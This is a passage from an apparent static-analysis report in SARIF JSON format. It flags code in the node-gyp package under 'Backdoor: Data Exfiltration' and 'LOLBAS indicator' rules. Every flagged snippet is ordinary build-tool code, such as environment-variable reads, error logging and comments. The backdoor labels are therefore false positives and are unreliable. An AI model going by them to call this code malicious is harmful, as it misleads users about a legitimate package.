            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/__init__.py"
                },
                "region": {
                  "startLine": 267,
                  "startColumn": 63,
                  "endLine": 267,
                  "endColumn": 74,
                  "snippet": {
                    "text": "            if value:\n                flags.append(FormatOpt(opt, value_predicate(value)))\n            elif options.use_environment and env_name and os.environ.get(env_name):\n                flags.append(FormatOpt(opt, value_predicate(os.environ.get(env_name))))\n        elif action in (\"store_true\", \"store_false\"):\n            if (action == \"store_true\" and value) or (\n                action == \"store_false\" and not value\n",
                    "rendered": {
                      "text": "            if value:\n                flags.append(FormatOpt(opt, value_predicate(value)))\n            elif options.use_environment and env_name and os.environ.get(env_name):\n                flags.append(FormatOpt(opt, value_predicate(os.environ.get(env_name))))\n        elif action in (\"store_true\", \"store_false\"):\n            if (action == \"store_true\" and value) or (\n                action == \"store_false\" and not value\n",
                      "markdown": "`            if value:\n                flags.append(FormatOpt(opt, value_predicate(value)))\n            elif options.use_environment and env_name and os.environ.get(env_name):\n                flags.append(FormatOpt(opt, value_predicate(os.environ.get(env_name))))\n        elif action in (\"store_true\", \"store_false\"):\n            if (action == \"store_true\" and value) or (\n                action == \"store_false\" and not value\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/__init__.py"
                },
                "region": {
                  "startLine": 266,
                  "startColumn": 29,
                  "endLine": 266,
                  "endColumn": 72,
                  "snippet": {
                    "text": "        elif action in (\"store\", None):  # None is a synonym for 'store'.\n            if value:\n                flags.append(FormatOpt(opt, value_predicate(value)))\n            elif options.use_environment and env_name and os.environ.get(env_name):\n                flags.append(FormatOpt(opt, value_predicate(os.environ.get(env_name))))\n        elif action in (\"store_true\", \"store_false\"):\n            if (action == \"store_true\" and value) or (\n",
                    "rendered": {
                      "text": "        elif action in (\"store\", None):  # None is a synonym for 'store'.\n            if value:\n                flags.append(FormatOpt(opt, value_predicate(value)))\n            elif options.use_environment and env_name and os.environ.get(env_name):\n                flags.append(FormatOpt(opt, value_predicate(os.environ.get(env_name))))\n        elif action in (\"store_true\", \"store_false\"):\n            if (action == \"store_true\" and value) or (\n",
                      "markdown": "`        elif action in (\"store\", None):  # None is a synonym for 'store'.\n            if value:\n                flags.append(FormatOpt(opt, value_predicate(value)))\n            elif options.use_environment and env_name and os.environ.get(env_name):\n                flags.append(FormatOpt(opt, value_predicate(os.environ.get(env_name))))\n        elif action in (\"store_true\", \"store_false\"):\n            if (action == \"store_true\" and value) or (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/__init__.py"
                },
                "region": {
                  "startLine": 195,
                  "startColumn": 15,
                  "endLine": 195,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\n\ndef ShlexEnv(env_name):\n    flags = os.environ.get(env_name, [])\n    if flags:\n        flags = shlex.split(flags)\n    return flags\n",
                    "rendered": {
                      "text": "\n\ndef ShlexEnv(env_name):\n    flags = os.environ.get(env_name, [])\n    if flags:\n        flags = shlex.split(flags)\n    return flags\n",
                      "markdown": "`\n\ndef ShlexEnv(env_name):\n    flags = os.environ.get(env_name, [])\n    if flags:\n        flags = shlex.split(flags)\n    return flags\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/specifiers.py"
                },
                "region": {
                  "startLine": 707,
                  "startColumn": 49,
                  "endLine": 707,
                  "endColumn": 53,
                  "snippet": {
                    "text": "    \"\"\"This class abstracts handling of a set of version specifiers.\n\n    It can be passed a single specifier (``>=3.0``), a comma-separated list of\n    specifiers (``>=3.0,!=3.1``), or no specifier at all.\n    \"\"\"\n\n    def __init__(\n",
                    "rendered": {
                      "text": "    \"\"\"This class abstracts handling of a set of version specifiers.\n\n    It can be passed a single specifier (``>=3.0``), a comma-separated list of\n    specifiers (``>=3.0,!=3.1``), or no specifier at all.\n    \"\"\"\n\n    def __init__(\n",
                      "markdown": "`    \"\"\"This class abstracts handling of a set of version specifiers.\n\n    It can be passed a single specifier (``>=3.0``), a comma-separated list of\n    specifiers (``>=3.0,!=3.1``), or no specifier at all.\n    \"\"\"\n\n    def __init__(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/specifiers.py"
                },
                "region": {
                  "startLine": 263,
                  "startColumn": 14,
                  "endLine": 263,
                  "endColumn": 18,
                  "snippet": {
                    "text": "        if self._prereleases is not None:\n            return self._prereleases\n\n        # Look at all of our specifiers and determine if they are inclusive\n        # operators, and if they are if they are including an explicit\n        # prerelease.\n        operator, version = self._spec\n",
                    "rendered": {
                      "text": "        if self._prereleases is not None:\n            return self._prereleases\n\n        # Look at all of our specifiers and determine if they are inclusive\n        # operators, and if they are if they are including an explicit\n        # prerelease.\n        operator, version = self._spec\n",
                      "markdown": "`        if self._prereleases is not None:\n            return self._prereleases\n\n        # Look at all of our specifiers and determine if they are inclusive\n        # operators, and if they are if they are including an explicit\n        # prerelease.\n        operator, version = self._spec\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/specifiers.py"
                },
                "region": {
                  "startLine": 167,
                  "startColumn": 50,
                  "endLine": 167,
                  "endColumn": 54,
                  "snippet": {
                    "text": "            )\n            |\n            (?:\n                # The compatible operator requires at least two digits in the\n                # release segment.\n                (?<=~=)               # Only match for the compatible operator\n\n",
                    "rendered": {
                      "text": "            )\n            |\n            (?:\n                # The compatible operator requires at least two digits in the\n                # release segment.\n                (?<=~=)               # Only match for the compatible operator\n\n",
                      "markdown": "`            )\n            |\n            (?:\n                # The compatible operator requires at least two digits in the\n                # release segment.\n                (?<=~=)               # Only match for the compatible operator\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/specifiers.py"
                },
                "region": {
                  "startLine": 124,
                  "startColumn": 61,
                  "endLine": 124,
                  "endColumn": 67,
                  "snippet": {
                    "text": "        (?P<version>\n            (?:\n                # The identity operators allow for an escape hatch that will\n                # do an exact string match of the version you wish to install.\n                # This will not be parsed by PEP 440 and we cannot determine\n                # any semantic meaning from it. This operator is discouraged\n                # but included entirely as an escape hatch.\n",
                    "rendered": {
                      "text": "        (?P<version>\n            (?:\n                # The identity operators allow for an escape hatch that will\n                # do an exact string match of the version you wish to install.\n                # This will not be parsed by PEP 440 and we cannot determine\n                # any semantic meaning from it. This operator is discouraged\n                # but included entirely as an escape hatch.\n",
                      "markdown": "`        (?P<version>\n            (?:\n                # The identity operators allow for an escape hatch that will\n                # do an exact string match of the version you wish to install.\n                # This will not be parsed by PEP 440 and we cannot determine\n                # any semantic meaning from it. This operator is discouraged\n                # but included entirely as an escape hatch.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/_parser.py"
                },
                "region": {
                  "startLine": 92,
                  "startColumn": 25,
                  "endLine": 92,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    tokenizer: Tokenizer,\n) -> Tuple[str, str, Optional[MarkerList]]:\n    \"\"\"\n    requirement_details = AT URL (WS requirement_marker?)?\n                        | specifier WS? (requirement_marker)?\n    \"\"\"\n\n",
                    "rendered": {
                      "text": "    tokenizer: Tokenizer,\n) -> Tuple[str, str, Optional[MarkerList]]:\n    \"\"\"\n    requirement_details = AT URL (WS requirement_marker?)?\n                        | specifier WS? (requirement_marker)?\n    \"\"\"\n\n",
                      "markdown": "`    tokenizer: Tokenizer,\n) -> Tuple[str, str, Optional[MarkerList]]:\n    \"\"\"\n    requirement_details = AT URL (WS requirement_marker?)?\n                        | specifier WS? (requirement_marker)?\n    \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/_parser.py"
                },
                "region": {
                  "startLine": 74,
                  "startColumn": 44,
                  "endLine": 74,
                  "endColumn": 48,
                  "snippet": {
                    "text": "    tokenizer.consume(\"WS\")\n\n    name_token = tokenizer.expect(\n        \"IDENTIFIER\", expected=\"package name at the start of dependency specifier\"\n    )\n    name = name_token.text\n    tokenizer.consume(\"WS\")\n",
                    "rendered": {
                      "text": "    tokenizer.consume(\"WS\")\n\n    name_token = tokenizer.expect(\n        \"IDENTIFIER\", expected=\"package name at the start of dependency specifier\"\n    )\n    name = name_token.text\n    tokenizer.consume(\"WS\")\n",
                      "markdown": "`    tokenizer.consume(\"WS\")\n\n    name_token = tokenizer.expect(\n        \"IDENTIFIER\", expected=\"package name at the start of dependency specifier\"\n    )\n    name = name_token.text\n    tokenizer.consume(\"WS\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/bin/node-gyp.js"
                },
                "region": {
                  "startLine": 133,
                  "startColumn": 11,
                  "endLine": 133,
                  "endColumn": 19,
                  "snippet": {
                    "text": "function issueMessage () {\n  errorMessage()\n  log.error('', ['Node-gyp failed to build your package.',\n    'Try to update npm and/or node-gyp and if it does not help file an issue with the package author.'\n  ].join('\\n'))\n}\n\n",
                    "rendered": {
                      "text": "function issueMessage () {\n  errorMessage()\n  log.error('', ['Node-gyp failed to build your package.',\n    'Try to update npm and/or node-gyp and if it does not help file an issue with the package author.'\n  ].join('\\n'))\n}\n\n",
                      "markdown": "`function issueMessage () {\n  errorMessage()\n  log.error('', ['Node-gyp failed to build your package.',\n    'Try to update npm and/or node-gyp and if it does not help file an issue with the package author.'\n  ].join('\\n'))\n}\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/bin/node-gyp.js"
                },
                "region": {
                  "startLine": 87,
                  "startColumn": 22,
                  "endLine": 87,
                  "endColumn": 28,
                  "snippet": {
                    "text": "      if (args.length) {\n        args.forEach((version) => log.stdout(version))\n      } else {\n        log.stdout('No node development files installed. Use `node-gyp install` to install a version.')\n      }\n    } else if (args.length >= 1) {\n      log.stdout(...args.slice(1))\n",
                    "rendered": {
                      "text": "      if (args.length) {\n        args.forEach((version) => log.stdout(version))\n      } else {\n        log.stdout('No node development files installed. Use `node-gyp install` to install a version.')\n      }\n    } else if (args.length >= 1) {\n      log.stdout(...args.slice(1))\n",
                      "markdown": "`      if (args.length) {\n        args.forEach((version) => log.stdout(version))\n      } else {\n        log.stdout('No node development files installed. Use `node-gyp install` to install a version.')\n      }\n    } else if (args.length >= 1) {\n      log.stdout(...args.slice(1))\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/bin/node-gyp.js"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 14,
                  "endLine": 2,
                  "snippet": {
                    "text": "#!/usr/bin/env node\n\n'use strict'\n\nprocess.title = 'node-gyp'\n",
                    "rendered": {
                      "text": "#!/usr/bin/env node\n\n'use strict'\n\nprocess.title = 'node-gyp'\n",
                      "markdown": "`#!/usr/bin/env node\n\n'use strict'\n\nprocess.title = 'node-gyp'\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000708"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (OS Type)",
            "id": "BD000708"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/bin/node-gyp.js"
                },
                "region": {
                  "startLine": 122,
                  "startColumn": 22,
                  "endLine": 122,
                  "endColumn": 29,
                  "snippet": {
                    "text": "function errorMessage () {\n  // copied from npm's lib/utils/error-handler.js\n  const os = require('os')\n  log.error('System', os.type() + ' ' + os.release())\n  log.error('command', process.argv\n    .map(JSON.stringify).join(' '))\n  log.error('cwd', process.cwd())\n",
                    "rendered": {
                      "text": "function errorMessage () {\n  // copied from npm's lib/utils/error-handler.js\n  const os = require('os')\n  log.error('System', os.type() + ' ' + os.release())\n  log.error('command', process.argv\n    .map(JSON.stringify).join(' '))\n  log.error('cwd', process.cwd())\n",
                      "markdown": "`function errorMessage () {\n  // copied from npm's lib/utils/error-handler.js\n  const os = require('os')\n  log.error('System', os.type() + ' ' + os.release())\n  log.error('command', process.argv\n    .map(JSON.stringify).join(' '))\n  log.error('cwd', process.cwd())\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 3025,
                  "startColumn": 40,
                  "endLine": 3025,
                  "endColumn": 44,
                  "snippet": {
                    "text": "        for key in tmp_dict:\n            target_dict[key] = tmp_dict[key]\n\n    # Make sure every dependency appears at most once.\n    RemoveDuplicateDependencies(targets)\n\n    if circular_check:\n",
                    "rendered": {
                      "text": "        for key in tmp_dict:\n            target_dict[key] = tmp_dict[key]\n\n    # Make sure every dependency appears at most once.\n    RemoveDuplicateDependencies(targets)\n\n    if circular_check:\n",
                      "markdown": "`        for key in tmp_dict:\n            target_dict[key] = tmp_dict[key]\n\n    # Make sure every dependency appears at most once.\n    RemoveDuplicateDependencies(targets)\n\n    if circular_check:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 3004,
                  "startColumn": 5,
                  "endLine": 3004,
                  "endColumn": 13,
                  "snippet": {
                    "text": "    # set to 1.\n    RemoveSelfDependencies(targets)\n\n    # Expand dependencies specified as build_file:*.\n    ExpandWildcardDependencies(targets, data)\n\n    # Remove all dependencies marked as 'link_dependency' from the targets of\n",
                    "rendered": {
                      "text": "    # set to 1.\n    RemoveSelfDependencies(targets)\n\n    # Expand dependencies specified as build_file:*.\n    ExpandWildcardDependencies(targets, data)\n\n    # Remove all dependencies marked as 'link_dependency' from the targets of\n",
                      "markdown": "`    # set to 1.\n    RemoveSelfDependencies(targets)\n\n    # Expand dependencies specified as build_file:*.\n    ExpandWildcardDependencies(targets, data)\n\n    # Remove all dependencies marked as 'link_dependency' from the targets of\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2843,
                  "startColumn": 75,
                  "endLine": 2844,
                  "snippet": {
                    "text": "def TurnIntIntoStrInDict(the_dict):\n    \"\"\"Given dict the_dict, recursively converts all integers into strings.\n  \"\"\"\n    # Use items instead of iteritems because there's no need to try to look at\n    # reinserted keys and their associated values.\n    for k, v in the_dict.items():\n        if type(v) is int:\n            v = str(v)\n",
                    "rendered": {
                      "text": "def TurnIntIntoStrInDict(the_dict):\n    \"\"\"Given dict the_dict, recursively converts all integers into strings.\n  \"\"\"\n    # Use items instead of iteritems because there's no need to try to look at\n    # reinserted keys and their associated values.\n    for k, v in the_dict.items():\n        if type(v) is int:\n            v = str(v)\n",
                      "markdown": "`def TurnIntIntoStrInDict(the_dict):\n    \"\"\"Given dict the_dict, recursively converts all integers into strings.\n  \"\"\"\n    # Use items instead of iteritems because there's no need to try to look at\n    # reinserted keys and their associated values.\n    for k, v in the_dict.items():\n        if type(v) is int:\n            v = str(v)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2664,
                  "startColumn": 71,
                  "endLine": 2665,
                  "snippet": {
                    "text": "                excluded_list.insert(0, the_list[index])\n                del the_list[index]\n\n        # If anything was excluded, put the excluded list into the_dict at\n        # excluded_key.\n        if len(excluded_list) > 0:\n            the_dict[excluded_key] = excluded_list\n\n",
                    "rendered": {
                      "text": "                excluded_list.insert(0, the_list[index])\n                del the_list[index]\n\n        # If anything was excluded, put the excluded list into the_dict at\n        # excluded_key.\n        if len(excluded_list) > 0:\n            the_dict[excluded_key] = excluded_list\n\n",
                      "markdown": "`                excluded_list.insert(0, the_list[index])\n                del the_list[index]\n\n        # If anything was excluded, put the excluded list into the_dict at\n        # excluded_key.\n        if len(excluded_list) > 0:\n            the_dict[excluded_key] = excluded_list\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2573,
                  "startColumn": 52,
                  "endLine": 2573,
                  "endColumn": 56,
                  "snippet": {
                    "text": "        if list_key not in lists:\n            lists.append(list_key)\n\n    # Delete the lists that are known to be unneeded at this point.\n    for del_list in del_lists:\n        del the_dict[del_list]\n\n",
                    "rendered": {
                      "text": "        if list_key not in lists:\n            lists.append(list_key)\n\n    # Delete the lists that are known to be unneeded at this point.\n    for del_list in del_lists:\n        del the_dict[del_list]\n\n",
                      "markdown": "`        if list_key not in lists:\n            lists.append(list_key)\n\n    # Delete the lists that are known to be unneeded at this point.\n    for del_list in del_lists:\n        del the_dict[del_list]\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2404,
                  "startColumn": 10,
                  "endLine": 2404,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    if configuration in visited:\n        return\n\n    # Look at this configuration.\n    configuration_dict = target_dict[\"configurations\"][configuration]\n\n    # Merge in parents.\n",
                    "rendered": {
                      "text": "    if configuration in visited:\n        return\n\n    # Look at this configuration.\n    configuration_dict = target_dict[\"configurations\"][configuration]\n\n    # Merge in parents.\n",
                      "markdown": "`    if configuration in visited:\n        return\n\n    # Look at this configuration.\n    configuration_dict = target_dict[\"configurations\"][configuration]\n\n    # Merge in parents.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2274,
                  "startColumn": 42,
                  "endLine": 2274,
                  "endColumn": 46,
                  "snippet": {
                    "text": "            while singleton and to_item in to:\n                to.remove(to_item)\n\n            # Don't just insert everything at index 0.  That would prepend the new\n            # items to the list in reverse order, which would be an unwelcome\n            # surprise.\n            to.insert(prepend_index, to_item)\n",
                    "rendered": {
                      "text": "            while singleton and to_item in to:\n                to.remove(to_item)\n\n            # Don't just insert everything at index 0.  That would prepend the new\n            # items to the list in reverse order, which would be an unwelcome\n            # surprise.\n            to.insert(prepend_index, to_item)\n",
                      "markdown": "`            while singleton and to_item in to:\n                to.remove(to_item)\n\n            # Don't just insert everything at index 0.  That would prepend the new\n            # items to the list in reverse order, which would be an unwelcome\n            # surprise.\n            to.insert(prepend_index, to_item)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2270,
                  "startColumn": 26,
                  "endLine": 2270,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        else:\n            # If prepending a singleton that's already in the list, remove the\n            # existing instance and proceed with the prepend.  This ensures that the\n            # item appears at the earliest possible position in the list.\n            while singleton and to_item in to:\n                to.remove(to_item)\n\n",
                    "rendered": {
                      "text": "        else:\n            # If prepending a singleton that's already in the list, remove the\n            # existing instance and proceed with the prepend.  This ensures that the\n            # item appears at the earliest possible position in the list.\n            while singleton and to_item in to:\n                to.remove(to_item)\n\n",
                      "markdown": "`        else:\n            # If prepending a singleton that's already in the list, remove the\n            # existing instance and proceed with the prepend.  This ensures that the\n            # item appears at the earliest possible position in the list.\n            while singleton and to_item in to:\n                to.remove(to_item)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2196,
                  "startColumn": 64,
                  "endLine": 2196,
                  "endColumn": 68,
                  "snippet": {
                    "text": "    if to_file == fro_file or exception_re.match(item):\n        return item\n    else:\n        # TODO(dglazkov) The backslash/forward-slash replacement at the end is a\n        # temporary measure. This should really be addressed by keeping all paths\n        # in POSIX until actual project generation.\n        ret = os.path.normpath(\n",
                    "rendered": {
                      "text": "    if to_file == fro_file or exception_re.match(item):\n        return item\n    else:\n        # TODO(dglazkov) The backslash/forward-slash replacement at the end is a\n        # temporary measure. This should really be addressed by keeping all paths\n        # in POSIX until actual project generation.\n        ret = os.path.normpath(\n",
                      "markdown": "`    if to_file == fro_file or exception_re.match(item):\n        return item\n    else:\n        # TODO(dglazkov) The backslash/forward-slash replacement at the end is a\n        # temporary measure. This should really be addressed by keeping all paths\n        # in POSIX until actual project generation.\n        ret = os.path.normpath(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 2137,
                  "startColumn": 13,
                  "endLine": 2137,
                  "endColumn": 21,
                  "snippet": {
                    "text": "                else:\n                    index = index + 1\n\n            # Update the dependencies. If the dependencies list is empty, it's not\n            # needed, so unhook it.\n            if len(dependencies) > 0:\n                target_dict[\"dependencies\"] = dependencies\n",
                    "rendered": {
                      "text": "                else:\n                    index = index + 1\n\n            # Update the dependencies. If the dependencies list is empty, it's not\n            # needed, so unhook it.\n            if len(dependencies) > 0:\n                target_dict[\"dependencies\"] = dependencies\n",
                      "markdown": "`                else:\n                    index = index + 1\n\n            # Update the dependencies. If the dependencies list is empty, it's not\n            # needed, so unhook it.\n            if len(dependencies) > 0:\n                target_dict[\"dependencies\"] = dependencies\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1910,
                  "startColumn": 41,
                  "endLine": 1910,
                  "endColumn": 45,
                  "snippet": {
                    "text": "                # If this is a subsequent target and it's linkable, don't look any\n                # further for linkable dependencies, as they'll already be linked into\n                # this target linkable.  Always look at dependencies of the initial\n                # target, and always look at dependencies of non-linkables.\n                for dependency in self.dependencies:\n                    dependency._LinkDependenciesInternal(\n                        targets, include_shared_libraries, dependencies, False\n",
                    "rendered": {
